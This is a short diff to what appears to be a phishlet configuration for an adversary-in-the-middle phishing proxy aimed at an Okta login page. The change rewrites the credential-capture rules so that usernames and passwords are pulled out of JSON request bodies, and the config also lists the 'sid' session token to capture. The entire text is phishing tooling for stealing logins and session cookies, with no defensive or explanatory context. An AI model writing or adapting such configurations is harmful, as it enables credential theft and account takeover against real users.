@@ -11,13 +11,13 @@ auth_tokens:
     keys: ['sid']
 credentials:
   username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
 login:
   domain: 'EXAMPLE.okta.com'
   path: '/login/login.htm'
